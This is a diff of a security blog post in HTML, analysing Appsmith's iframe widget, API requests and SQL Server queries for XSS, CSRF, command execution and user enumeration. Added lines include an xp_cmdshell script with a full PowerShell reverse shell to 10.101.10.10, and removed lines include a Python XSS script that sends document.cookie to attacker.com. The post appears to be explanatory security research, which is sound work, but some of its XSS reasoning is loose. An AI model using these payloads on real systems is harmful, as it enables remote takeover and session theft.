+    "canExtend": true,
+    "version": 78,
+    "minHeight": 1292,
+    "dynamicTriggerPathList": &#91;],
+    "parentColumnSpace": 1,
+    "dynamicBindingPathList": &#91;],
+    "leftColumn": 0,
+    "children": &#91;
+      {
+        "boxShadow": "{{appsmith.theme.boxShadow.appBoxShadow}}",
+        "mobileBottomRow": 52,
+        "widgetName": "Iframe1",
+        "dynamicPropertyPathList": &#91;
+          {
+            "key": "animateLoading"
+          }
+        ],
+        "displayName": "Iframe",
+        "iconSVG": "/static/media/icon.34169b6acebc8ace125dd1f638974aae.svg",
+        "searchTags": &#91;
+          "embed"
+        ],
+        "topRow": 20,
+        "bottomRow": 52,
+        "parentRowSpace": 10,
+        "source": "https://www.example.com",
+        "type": "IFRAME_WIDGET",
+        "hideCard": false,
+        "mobileRightColumn": 46,
+        "borderOpacity": 100,
+        "animateLoading": "",
+        "parentColumnSpace": 16.09375,
+        "dynamicTriggerPathList": &#91;],
+        "leftColumn": 22,
+        "dynamicBindingPathList": &#91;
+          {
+            "key": "borderRadius"
+          },
+          {
+            "key": "boxShadow"
+          }
+        ],
+        "borderWidth": 1,
+        "key": "xl1nfrhtz9",
+        "isDeprecated": false,
+        "rightColumn": 46,
+        "widgetId": "w8kiqu9sjk",
+        "isVisible": true,
+        "version": 1,
+        "parentId": "0",
+        "renderMode": "CANVAS",
+        "isLoading": false,
+        "mobileTopRow": 20,
+        "responsiveBehavior": "fill",
+        "borderRadius": "{{appsmith.theme.borderRadius.appBorderRadius}}",
+        "mobileLeftColumn": 22,
+        "srcDoc": "&lt;p&gt;aaaa&lt;/p&gt;\n"
+      },
+      {
+        "mobileBottomRow": 66,
+        "widgetName": "Text1",
+        "dynamicPropertyPathList": &#91;
+          {
+            "key": "animateLoading"
+          }
+        ],
+        "displayName": "Text",
+        "iconSVG": "/static/media/icon.97c59b523e6f70ba6f40a10fc2c7c5b5.svg",
+        "searchTags": &#91;
+          "typography",
+          "paragraph",
+          "label"
+        ],
+        "topRow": 62,
+        "bottomRow": 66,
+        "parentRowSpace": 10,
+        "type": "TEXT_WIDGET",
+        "hideCard": false,
+        "mobileRightColumn": 20,
+        "animateLoading": "",
+        "overflow": "NONE",
+        "fontFamily": "{{appsmith.theme.fontFamily.appFont}}",
+        "parentColumnSpace": 16.09375,
+        "dynamicTriggerPathList": &#91;],
+        "leftColumn": 4,
+        "dynamicBindingPathList": &#91;
+          {
+            "key": "truncateButtonColor"
+          },
+          {
+            "key": "fontFamily"
+          },
+          {
+            "key": "borderRadius"
+          }
+        ],
+        "shouldTruncate": false,
+        "truncateButtonColor": "{{appsmith.theme.colors.primaryColor}}",
+        "text": "Label",
+        "key": "ufr0tiolsh",
+        "isDeprecated": false,
+        "rightColumn": 20,
+        "textAlign": "LEFT",
+        "dynamicHeight": "AUTO_HEIGHT",
+        "widgetId": "btt2y1wext",
+        "minWidth": 450,
+        "isVisible": true,
+        "fontStyle": "BOLD",
+        "textColor": "#231F20",
+        "version": 1,
+        "parentId": "0",
+        "renderMode": "CANVAS",
+        "isLoading": false,
+        "mobileTopRow": 62,
+        "responsiveBehavior": "fill",
+        "borderRadius": "{{appsmith.theme.borderRadius.appBorderRadius}}",
+        "mobileLeftColumn": 4,
+        "maxDynamicHeight": 9000,
+        "fontSize": "1rem",
+        "minDynamicHeight": 4
+      }
+    ]
+  }
+}</code></pre>
+
+
+
+<p class="wp-block-paragraph">This payload represents a layout with two widgets:</p>
+
+
+
+<ol class="wp-block-list">
+<li>MainContainer:
+<ul class="wp-block-list">
+<li>Type: CANVAS_WIDGET</li>
+
+
+
+<li>It defines the layout container properties such as dimensions, background color, and child widgets.</li>
+</ul>
+</li>
+
+
+
+<li>Iframe1:
+<ul class="wp-block-list">
+<li>Type: IFRAME_WIDGET</li>
+
+
+
+<li>It represents an iframe widget with properties like source URL, position, visibility, and styling.</li>
+</ul>
+</li>
+
+
+
+<li>Text1:
+<ul class="wp-block-list">
+<li>Type: TEXT_WIDGET</li>
+
+
+
+<li>It represents a text widget with properties like text content, position, visibility, and styling.</li>
+</ul>
+</li>
+</ol>
+
+
+
+<p class="wp-block-paragraph">The request aims to update the layout of a page specified by the page ID (<code>648054730ed24064ee24c6e8</code>) within the layout (<code>648054730ed24064ee24c6e6</code>) of an application (<code>648054730ed24064ee24c6e5</code>).</p>
+
+
+
+<pre class="wp-block-code"><code>{message ? (
+  message
+) : srcDoc ? (
+  &lt;iframe
+    allow="camera; microphone"
+    id={`iframe-${widgetName}`}
+    ref={frameRef}
+    sandbox={disableIframeWidgetSandbox ? undefined : "allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-scripts allow-top-navigation-by-user-activation"}
+    src={source}
+    srcDoc={srcDoc}
+    title={title}
+  /&gt;
+) : (
+  &lt;iframe
+    allow="camera; microphone"
+    id={`iframe-${widgetName}`}
+    ref={frameRef}
+    src={source}
+    title={title}
+  /&gt;
+)}</code></pre>
+
+
+
+<ol class="wp-block-list">
+<li>The code uses a ternary operator to check if the <code>message</code> variable has a truthy value. If it does, the value of <code>message</code> is rendered as the content within the iframe.</li>
+
+
+
+<li>If the <code>message</code> variable is falsy, the code proceeds to the next ternary operator. It checks if the <code>srcDoc</code> variable has a truthy value.</li>
+
+
+
+<li>If the <code>srcDoc</code> variable has a truthy value, an iframe element is rendered with the following attributes:
+<ul class="wp-block-list">
+<li><code>allow</code>: Specifies permissions for camera and microphone access within the iframe.</li>
+
+
+
+<li><code>id</code>: Sets the id attribute of the iframe element dynamically based on the <code>widgetName</code> variable.</li>
+
+
+
+<li><code>ref</code>: Assigns a reference to the iframe element.</li>
+
+
+
+<li><code>sandbox</code>: Specifies sandboxing attributes for the iframe. If <code>disableIframeWidgetSandbox</code> is truthy, the sandbox attribute is set to <code>undefined</code>, otherwise, it allows various permissions like forms, modals, orientation lock, pointer lock, popups, scripts, and top navigation by user activation.</li>
+
+
+
+<li><code>src</code>: Sets the source URL for the iframe dynamically based on the <code>source</code> variable.</li>
+
+
+
+<li><code>srcDoc</code>: Sets the source code or document content for the iframe dynamically based on the <code>srcDoc</code> variable.</li>
+
+
+
+<li><code>title</code>: Sets the title attribute of the iframe element dynamically based on the <code>title</code> variable.</li>
+</ul>
+</li>
+
+
+
+<li>If both <code>message</code> and <code>srcDoc</code> variables are falsy, a fallback iframe element is rendered with similar attributes as described above, but without the <code>srcDoc</code> attribute.</li>
+</ol>
+
+
+
+<figure class="wp-block-image size-full"><img decoding="async" width="634" height="593" src="/wp-content/uploads/2023/06/r2.png" alt="srcDoc attribute" class="wp-image-7158" srcset="/wp-content/uploads/2023/06/r2.png 634w, /wp-content/uploads/2023/06/r2-300x281.png 300w" sizes="(max-width: 634px) 100vw, 634px" /></figure>
+
+
+
+<p class="wp-block-paragraph">it appears that the potential XSS vulnerability lies in the <code>message</code> variable being rendered directly without proper sanitization or encoding. Let&#8217;s analyze the code step by step to identify the vulnerability:</p>
+
+
+
+<ol class="wp-block-list">
+<li>The <code>message</code> variable is conditionally rendered within the code. If it contains user-generated content, it could potentially introduce an XSS vulnerability if it is not properly sanitized.</li>
+
+
+
+<li>The <code>message</code> variable is directly interpolated within the JSX code. This means that any malicious script or content present in the <code>message</code> variable will be rendered and executed as-is.</li>
+</ol>
+
+
+
+<p class="wp-block-paragraph">To mitigate this potential XSS vulnerability, you should ensure that the <code>message</code> variable is properly sanitized or encoded before being rendered. There are multiple approaches you can take, such as:</p>
+
+
+
+<ul class="wp-block-list">
+<li>Sanitizing the <code>message</code> variable using a library like DOMPurify or implementing custom sanitization functions. This will remove or escape any potentially dangerous HTML or JavaScript tags and prevent them from being executed.</li>
+
+
+
+<li>Implementing output encoding or escaping techniques such as converting special characters to their HTML entities (<code>&lt;</code> to <code>&amp;lt;</code>, <code>&gt;</code> to <code>&amp;gt;</code>, etc.) to ensure that the <code>message</code> content is treated as plain text and not interpreted as executable code.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">Here&#8217;s an example of how the code can be modified to mitigate the XSS vulnerability:</p>
+
+
+
+<pre class="wp-block-code"><code>{message ? (
+  &lt;div&gt;{sanitizeMessage(message)}&lt;/div&gt;
+) : srcDoc ? (
+  &lt;iframe
+    allow="camera; microphone"
+    id={`iframe-${widgetName}`}
+    ref={frameRef}
+    sandbox={
+      disableIframeWidgetSandbox
+        ? undefined
+        : "allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-scripts allow-top-navigation-by-user-activation"
     }
-
-    printf("&lt;/body>&lt;/html>");
-
-    return 0;
-}
-</code></pre>
-
-
-
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="894" height="571" src="/wp-content/uploads/2024/01/image-3.png" alt="" class="wp-image-8312" srcset="/wp-content/uploads/2024/01/image-3.png 894w, /wp-content/uploads/2024/01/image-3-300x192.png 300w, /wp-content/uploads/2024/01/image-3-768x491.png 768w" sizes="(max-width: 894px) 100vw, 894px" /></figure>
-
-
-
-<p class="wp-block-paragraph">In this vulnerable CGI program written in C, we process the query string parameters received from the client&#8217;s HTTP request. However, we fail to properly sanitize the input, allowing potential injection of malicious scripts.</p>
-
-
-
-<p class="wp-block-paragraph">An attacker could craft a malicious URL like http://example.com/vulnerable.cgi?name=&lt;script&gt;alert(&#8216;XSS&#8217;)&lt;/script&gt; to inject a script into the web page, leading to the execution of the script in the victim&#8217;s browser.</p>
+    src={source}
+    srcDoc={sanitizeSrcDoc(srcDoc)}
+    title={title}
+  /&gt;
+) : (
+  &lt;iframe
+    allow="camera; microphone"
+    id={`iframe-${widgetName}`}
+    ref={frameRef}
+    src={source}
+    title={title}
+  /&gt;
+)}</code></pre>
 
 
 
-<p class="wp-block-paragraph">In this Python script, we use the requests library to send a POST request to the vulnerable web application (vulnerable_url) with a payload containing a malicious script (malicious_script). The script is crafted to steal the user&#8217;s session cookie and send it to the attacker&#8217;s server.</p>
+<p class="wp-block-paragraph">In this modified code, the <code>sanitizeMessage()</code> function is used to sanitize the <code>message</code> content before rendering it within a <code>&lt;div&gt;</code> element. The <code>sanitizeSrcDoc()</code> function can also be used to sanitize the <code>srcDoc</code> content, if applicable, before rendering it within the <code>&lt;iframe&gt;</code> element.</p>
 
 
 
-<p class="wp-block-paragraph">To execute this script successfully, the attacker needs to replace &#8220;http://example.com/vulnerable.cgi&#8221; with the URL of the actual vulnerable web application and &#8220;http://attacker.com/steal-cookie&#8221; with the URL of their server where they want to receive the stolen session cookies.</p>
+<h3 class="wp-block-heading"><strong>CSRF to *</strong></h3>
 
 
 
-<pre class="wp-block-code"><code>import requests
-
-# URL of the vulnerable web application
-vulnerable_url = "http://example.com/vulnerable.cgi"
-
-# Malicious script to be injected
-malicious_script = "&lt;script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/steal-cookie?cookie=' + document.cookie, true); xhr.send();&lt;/script>"
-
-# Craft the payload with the malicious script
-payload = {"input_field": malicious_script}
-
-# Send the malicious request to the vulnerable web application
-response = requests.post(vulnerable_url, data=payload)
-
-# Check if the request was successful
-if response.status_code == 200:
-    print("XSS exploit successful! Malicious script injected.")
-else:
-    print("Failed to inject malicious script.")
-</code></pre>
+<p class="wp-block-paragraph">The provided request is an example of a PUT request to the <code>/api/v1/actions/64806e0b0ed24064ee24c747</code> endpoint on the <code>appsmith.dev</code> server. Let&#8217;s break down the different parts of the request:</p>
 
 
 
-<h2 class="wp-block-heading">Configuration Broken Access Control</h2>
+<pre class="wp-block-code"><code>PUT /api/v1/actions/64806e0b0ed24064ee24c747 HTTP/1.1
+Host: appsmith.dev
+Cookie: SESSION=5298d253-c5e8-4d20-886c-bdd608b7987b
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: application/json, text/plain, /
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 1168
+X-Requested-By: Appsmith
+Origin: https://appsmith.dev/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Referer: https://appsmith.dev/app/untitled-application-3/page1-648054730ed24064ee24c6e8/edit/queries/64806e0b0ed24064ee24c747
+Te: trailers
+Connection: close
+
+{
+  "id": "64806e0b0ed24064ee24c747",
+  "applicationId": "648054730ed24064ee24c6e5",
+  "workspaceId": "6457cb919f194a66036e1bc2",
+  "pluginType": "DB",
+  "pluginName": "Microsoft SQL Server",
+  "pluginId": "6457cb8b9f194a66036e1ba6",
+  "datasource": {
+    "id": "64806c5c0ed24064ee24c734",
+    "userPermissions": &#91;],
+    "name": "Untitled Datasource 2",
+    "pluginId": "6457cb8b9f194a66036e1ba6",
+    "messages": &#91;
+      "You may not be able to access your localhost if Appsmith is running inside a docker container or on the cloud. To enable access to your localhost you may use ngrok to expose your local endpoint to the internet. Please check out Appsmith's documentation to understand more."
+    ],
+    "isValid": true,
+    "new": false
+  },
+  "pageId": "648054730ed24064ee24c6e8",
+  "actionConfiguration": {
+    "timeoutInMillisecond": 10000,
+    "paginationType": "NONE",
+    "encodeParamsToggle": true,
+    "body": "SELECT * FROM aaa;",
+    "selfReferencingDataPaths": &#91;],
+    "pluginSpecifiedTemplates": &#91;
+      {
+        "value": true
+      }
+    ]
+  },
+  "errorReports": &#91;],
+  "executeOnLoad": false,
+  "dynamicBindingPathList": &#91;],
+  "isValid": true,
+  "invalids": &#91;],
+  "messages": &#91;],
+  "jsonPathKeys": &#91;],
+  "confirmBeforeExecute": false,
+  "userPermissions": &#91;
+    "read:actions",
+    "delete:actions",
+    "execute:actions",
+    "manage:actions"
+  ],
+  "validName": "Query7"
+}</code></pre>
 
 
 
-<p class="wp-block-paragraph">Access controls are fundamental security measures that determine who can access specific resources and what actions they can perform. Broken access controls occur when these measures are improperly implemented or entirely missing, allowing unauthorized users to access restricted resources. One severe manifestation of this vulnerability is the unrestricted access to export configurations.</p>
+<ul class="wp-block-list">
+<li>Method: PUT The request method is PUT, which indicates that the client wants to update an existing resource on the server.</li>
 
 
 
-<p class="wp-block-paragraph">The Scenario: Imagine a web application or system that allows users to export configurations, which may contain sensitive information or system settings. If there are no proper access controls in place, any user, including potential attackers, can access and export these configurations without any security limitations.</p>
+<li>Path: <code>/api/v1/actions/64806e0b0ed24064ee24c747</code> The path specifies the endpoint on the server to which the request is being made. In this case, it is the <code>/api/v1/actions/64806e0b0ed24064ee24c747</code> endpoint.</li>
 
 
 
-<p class="wp-block-paragraph">Exposure of Sensitive Information: Configurations often contain sensitive data, such as API keys, database credentials, or system settings.</p>
+<li>Headers:
+<ul class="wp-block-list">
+<li>Host: appsmith.dev The Host header specifies the hostname of the server.</li>
 
 
 
-<p class="wp-block-paragraph">Unauthorized access to this information can lead to data breaches or system compromises. System Vulnerability: By analyzing exported configurations, attackers can identify potential vulnerabilities or misconfigurations in the system, which they can then exploit. Operational Disruption: With access to configurations, malicious actors can alter settings, potentially disrupting operations or causing system malfunctions. Loss of Intellectual Property: Configurations may also contain proprietary algorithms, settings, or other intellectual properties that, if exposed, can lead to competitive disadvantages.</p>
+<li>Cookie: SESSION=5298d253-c5e8-4d20-886c-bdd608b7987b The Cookie header is used to send previously stored cookies back to the server.</li>
 
 
 
-<pre class="wp-block-code"><code>#include &lt;stdio.h>
-#include &lt;stdlib.h>
-#include &lt;string.h>
+<li>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 The User-Agent header provides information about the client making the request, in this case, it indicates that the request is being made from Mozilla Firefox on a Linux x86_64 system.</li>
 
-int main() {
-    // Print HTTP header
-    printf("Content-Type: text/plain\n\n");
 
-    // Check if the requested file is ik1212.txt
-    char *query_string = getenv("QUERY_STRING");
-    if (query_string != NULL &amp;&amp; strstr(query_string, "file=ik1212.txt") != NULL) {
-        // In a real-world scenario, access controls should be implemented here
-        // to check if the user has permission to access the requested file.
 
-        // Read the content of the configuration file
-        FILE *file = fopen("/path/to/ik1212.txt", "r");
-        if (file != NULL) {
-            char buffer&#91;1024];
-            size_t bytesRead;
-            while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
-                fwrite(buffer, 1, bytesRead, stdout);
-            }
-            fclose(file);
-        } else {
-            // Error: File not found or inaccessible
-            printf("Error: Configuration file not found or inaccessible\n");
-        }
+<li>Accept: application/json, text/plain, / The Accept header specifies the media types that the client can handle in the response.</li>
+
+
+
+<li>Accept-Language: en-US,en;q=0.5 The Accept-Language header specifies the preferred language of the client.</li>
+
+
+
+<li>Accept-Encoding: gzip, deflate The Accept-Encoding header specifies the compression algorithms supported by the client.</li>
+
+
+
+<li>Content-Type: application/json The Content-Type header indicates that the body of the request is in JSON format.</li>
+
+
+
+<li>Content-Length: 1168 The Content-Length header specifies the length of the request body in bytes.</li>
+
+
+
+<li>X-Requested-By: Appsmith The X-Requested-By header is a custom header that might be used to identify the source of the request.</li>
+
+
+
+<li>Origin: <a href="https://appsmith.dev/">https://appsmith.dev/</a> The Origin header indicates the origin (protocol, domain, and port) of the request.</li>
+
+
+
+<li>Sec-Fetch-Dest, Sec-Fetch-Mode, Sec-Fetch-Site: These headers are part of the Fetch Metadata specification and provide additional information about the request.</li>
+
+
+
+<li>Referer:<strong><mark style="background-color:rgba(0, 0, 0, 0);color:#201cf0" class="has-inline-color"> </mark></strong><mark style="background-color:rgba(0, 0, 0, 0);color:#201cf0" class="has-inline-color"><strong><a href="https://appsmith.dev/app/untitled-application-3/page1-648054730ed24064ee24c6e8/edit/queries/64806e0b0ed24064ee24c747">https://appsmith.dev/app/untitled-application-3/page1-648054730ed24064ee24c6e8/edit/queries/64806e0b0ed24064ee24c747</a></strong> </mark>The Referer header specifies the URL of the page that referred the client to the current page.</li>
+
+
+
+<li>Te: trailers The Te header specifies the trailer fields present in the request.</li>
+
+
+
+<li>Connection: close The Connection header indicates that the client wants to close the connection after the request is complete.</li>
+</ul>
+</li>
+
+
+
+<li>Request Body: The request body is a JSON object that contains data related to the action being updated. It includes properties such as <code>id</code>, <code>applicationId</code>, <code>workspaceId</code>, <code>pluginType</code>, <code>pluginName</code>, <code>pluginId</code>, <code>datasource</code>, <code>pageId</code>, <code>actionConfiguration</code>, and other fields specific to the action.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">This is an example of an HTTP POST request. Let&#8217;s break down the different components:</p>
+
+
+
+<pre class="wp-block-code"><code>POST /api/v1/actions/execute HTTP/1.1
+Host: appsmith.dev
+Cookie: SESSION=5298d253-c5e8-4d20-886c-bdd608b7987b
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------29755607186598746733842408645
+Content-Length: 260
+X-Requested-By: Appsmith
+Origin: https://appsmith.dev/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Referer: https://appsmith.dev/app/untitled-application-3/page1-648054730ed24064ee24c6e8/edit/queries/64806e0b0ed24064ee24c747
+Te: trailers
+Connection: close
+
+-----------------------------29755607186598746733842408645
+Content-Disposition: form-data; name="executeActionDTO"
+
+{"actionId":"64806e0b0ed24064ee24c747","viewMode":false,"paramProperties":{}}</code></pre>
+
+
+
+<ol class="wp-block-list">
+<li>Request Line:
+<ul class="wp-block-list">
+<li>Method: POST</li>
+
+
+
+<li>Path: <code>/api/v1/actions/execute</code></li>
+
+
+
+<li>HTTP Version: HTTP/1.1</li>
+</ul>
+</li>
+
+
+
+<li>Headers:
+<ul class="wp-block-list">
+<li>Host: <code>appsmith.dev</code> (Specifies the host domain)</li>
+
+
+
+<li>Cookie: <code>SESSION=5298d253-c5e8-4d20-886c-bdd608b7987b</code> (Contains session information for the user)</li>
+
+
+
+<li>User-Agent: <code>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</code> (Indicates the user agent making the request)</li>
+
+
+
+<li>Accept: <code>application/json</code> (Specifies the desired response format)</li>
+
+
+
+<li>Accept-Language: <code>en-US,en;q=0.5</code> (Specifies the preferred language for the response)</li>
+
+
+
+<li>Accept-Encoding: <code>gzip, deflate</code> (Indicates the supported content encodings)</li>
+
+
+
+<li>Content-Type: <code>multipart/form-data; boundary=---------------------------29755607186598746733842408645</code> (Specifies the content type and the boundary for the multipart form data)</li>
+
+
+
+<li>Content-Length: <code>260</code> (Specifies the length of the request body in bytes)</li>
+
+
+
+<li>X-Requested-By: <code>Appsmith</code> (Identifies the requester)</li>
+
+
+
+<li>Origin: <code>https://appsmith.dev/</code> (Indicates the origin of the request)</li>
+
+
+
+<li>Sec-Fetch-Dest: <code>empty</code> (Specifies the destination of the request)</li>
+
+
+
+<li>Sec-Fetch-Mode: <code>cors</code> (Specifies the mode for cross-origin requests)</li>
+
+
+
+<li>Sec-Fetch-Site: <code>same-origin</code> (Specifies the site for the request)</li>
+
+
+
+<li>Referer: <code>https://appsmith.dev/app/untitled-application-3/page1-648054730ed24064ee24c6e8/edit/queries/64806e0b0ed24064ee24c747</code> (Indicates the referring page)</li>
+
+
+
+<li>Te: <code>trailers</code> (Indicates the transfer encoding capabilities)</li>
+
+
+
+<li>Connection: <code>close</code> (Specifies the connection should be closed after the response)</li>
+</ul>
+</li>
+
+
+
+<li>Request Body: The request body is sent as multipart form data. It consists of a single part with the name &#8220;executeActionDTO&#8221;. The value of this part is a JSON object containing the following properties:
+<ul class="wp-block-list">
+<li>actionId: &#8220;64806e0b0ed24064ee24c747&#8221; (Specifies the ID of the action to execute)</li>
+
+
+
+<li>viewMode: false (Indicates whether the execution is in view mode)</li>
+
+
+
+<li>paramProperties: {} (Specifies the properties of the parameters for the action execution)</li>
+</ul>
+</li>
+</ol>
+
+
+
+<pre class="wp-block-code"><code>function* saveActionName(action: ReduxAction&lt;{ id: string; name: string }&gt;) {
+  // Takes from state, checks if the name isValid, saves
+  const apiId = action.payload.id;
+  const api = shouldBeDefined&lt;ActionData&gt;(
+    yield select((state) =&gt;
+      state.entities.actions.find(
+        (action: ActionData) =&gt; action.config.id === apiId,
+      ),
+    ),
+    `Api not found for apiId - ${apiId}`,
+  );
+
+  try {
+    yield refactorActionName(
+      api.config.id,
+      api.config.pageId,
+      api.config.name,
+      action.payload.name,
+    );
+  } catch (e) {
+    yield put({
+      type: ReduxActionErrorTypes.SAVE_ACTION_NAME_ERROR,
+      payload: {
+        actionId: action.payload.id,
+        oldName: api.config.name,
+      },
+    });
+    toast.show(createMessage(ERROR_ACTION_RENAME_FAIL, action.payload.name), {
+      kind: "error",
+    });
+    log.error(e);
+  }
+}</code></pre>
+
+
+
+<p class="wp-block-paragraph">This code is a generator function called <code>saveActionName</code> that takes a <code>ReduxAction</code> object as a parameter. Here&#8217;s a breakdown of what the code does:</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="1019" height="746" src="/wp-content/uploads/2023/06/r3.png" alt="ReduxAction" class="wp-image-7160" srcset="/wp-content/uploads/2023/06/r3.png 1019w, /wp-content/uploads/2023/06/r3-300x220.png 300w, /wp-content/uploads/2023/06/r3-768x562.png 768w" sizes="(max-width: 1019px) 100vw, 1019px" /></figure>
+
+
+
+<ol class="wp-block-list">
+<li>It extracts the <code>id</code> property from the <code>payload</code> of the <code>action</code> parameter and assigns it to the <code>apiId</code> constant.</li>
+
+
+
+<li>It uses the <code>yield</code> keyword along with the <code>select</code> function to retrieve the state from the generator&#8217;s context. It searches for an <code>ActionData</code> object in the state&#8217;s <code>entities.actions</code> array that has a <code>config.id</code> matching the <code>apiId</code>.</li>
+
+
+
+<li>The <code>shouldBeDefined</code> function is called to ensure that the <code>api</code> variable is defined. If it is not defined, an error message is thrown with the corresponding <code>apiId</code>.</li>
+
+
+
+<li>Inside a <code>try</code> block, the <code>refactorActionName</code> function is called with the <code>api.config.id</code>, <code>api.config.pageId</code>, <code>api.config.name</code>, and <code>action.payload.name</code> as arguments. This function likely performs some action to refactor the name of an action.</li>
+
+
+
+<li>If an exception is caught in the <code>try</code> block, the <code>catch</code> block is executed.
+<ul class="wp-block-list">
+<li>It uses the <code>yield</code> keyword along with the <code>put</code> function to dispatch a Redux action of type <code>ReduxActionErrorTypes.SAVE_ACTION_NAME_ERROR</code>. The payload of this action includes the <code>actionId</code> from <code>action.payload.id</code> and the <code>oldName</code> from <code>api.config.name</code>.</li>
+
+
+
+<li>It calls the <code>toast.show</code> function to display an error message using <code>createMessage</code> with the <code>ERROR_ACTION_RENAME_FAIL</code> constant and <code>action.payload.name</code>.</li>
+
+
+
+<li>It logs the caught exception <code>e</code> using <code>log.error</code>.</li>
+</ul>
+</li>
+</ol>
+
+
+
+<pre class="wp-block-code"><code>DECLARE @cmd VARCHAR(200)
+DECLARE @output TABLE (output VARCHAR(200))
+
+-- Set the command to be executed (e.g., a reverse shell)
+SET @cmd = 'powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient(''10.101.10.10'',443);$stream = $client.GetStream();&#91;byte&#91;]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String);$sendback2 = $sendback + ''PS '' + (pwd).Path + ''&gt; ''; $sendbyte = (&#91;text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
+
+-- Execute the command using xp_cmdshell
+INSERT INTO @output
+EXEC xp_cmdshell @cmd
+
+-- Retrieve the output from the executed command
+SELECT output FROM @output</code></pre>
+
+
+
+<p class="wp-block-paragraph">Here&#8217;s a breakdown of the code:</p>
+
+
+
+<ol class="wp-block-list">
+<li><code>DECLARE @cmd VARCHAR(200)</code> declares a variable <code>@cmd</code> of type <code>VARCHAR(200)</code> to store the command to be executed.</li>
+
+
+
+<li><code>DECLARE @output TABLE (output VARCHAR(200))</code> declares a table variable <code>@output</code> with a single column <code>output</code> of type <code>VARCHAR(200)</code> to store the output of the executed command.</li>
+
+
+
+<li><code>SET @cmd = 'powershell.exe -c "...reverse shell command..."'</code> sets the value of <code>@cmd</code> to a PowerShell command that establishes a reverse shell connection to IP address &#8216;10.101.10.10&#8217; on port 443. This command is used as an example and demonstrates the potential for unauthorized access. It is essential to use such commands responsibly and with proper authorization.</li>
+
+
+
+<li><code>INSERT INTO @output EXEC xp_cmdshell @cmd</code> executes the command stored in <code>@cmd</code> using the <code>xp_cmdshell</code> extended stored procedure. The result of the command execution is inserted into the <code>@output</code> table variable.</li>
+
+
+
+<li><code>SELECT output FROM @output</code> retrieves the output of the executed command from the <code>@output</code> table variable.</li>
+</ol>
+
+
+
+<p class="wp-block-paragraph"><strong>Enumeration and Content Injection</strong></p>
+
+
+
+<ol class="wp-block-list">
+<li>User Enumeration: User enumeration refers to the process of identifying valid usernames or user accounts within a system or application. Attackers can exploit user enumeration vulnerabilities to gather information about valid user accounts, which can be used for further attacks such as brute-force attacks or targeted phishing attempts.</li>
+</ol>
+
+
+
+<p class="wp-block-paragraph">User enumeration vulnerabilities typically occur when an application responds differently to valid and invalid user inputs. For example, when a user enters a valid username, the application might provide a different response (e.g., &#8220;Username exists&#8221;) compared to when an invalid username is entered (e.g., &#8220;Username does not exist&#8221;). By observing these differing responses, an attacker can systematically test a list of usernames to determine which ones are valid.</p>
+
+
+
+<p class="wp-block-paragraph">To mitigate user enumeration vulnerabilities, it&#8217;s important for applications to provide consistent responses regardless of whether a username is valid or not. This can be achieved by ensuring that error messages or responses do not reveal sensitive information about the existence or non-existence of user accounts.</p>
+
+
+
+<ol class="wp-block-list" start="2">
+<li>Content Injection: Content injection, also known as code injection or remote code execution, refers to a vulnerability where an attacker can inject malicious code or content into a web application. This can lead to various security risks depending on the context in which the injection occurs.</li>
+</ol>
+
+
+
+<p class="wp-block-paragraph">Content injection vulnerabilities can arise due to inadequate input validation and lack of proper security controls. Attackers can exploit these vulnerabilities to insert malicious code, scripts, or commands into the application, which can result in unauthorized access, data theft, system compromise, or other malicious activities.</p>
+
+
+
+<pre class="wp-block-code"><code>POST /api/v1/users HTTP/1.1
+Host: appsmith.dev
+Cookie: &#91;REDACTED]
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Referer: &#91;REDACTED]
+Origin: https://appsmith.dev/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+
+email=&#91;REDACTED]&amp;password=&#91;REDACTED]</code></pre>
+
+
+
+<p class="wp-block-paragraph">This code snippet appears to be a part of a larger codebase that handles authentication and redirects in a web application.</p>
+
+
+
+<pre class="wp-block-code"><code>// Authentication failure message can hold sensitive information, directly or indirectly. So we don't show all
+// possible error messages. Only the ones we know are okay to be read by the user. Like a whitelist.
+URI defaultRedirectLocation;
+String url = "";
+
+if (exception instanceof OAuth2AuthenticationException &amp;&amp; AppsmithError.SIGNUP_DISABLED.getAppErrorCode().toString().equals(((OAuth2AuthenticationException) exception).getError().getErrorCode())) {
+    url = "/user/signup?error=" + URLEncoder.encode(exception.getMessage(), StandardCharsets.UTF_8);
+} else {
+    if (exception instanceof InternalAuthenticationServiceException) {
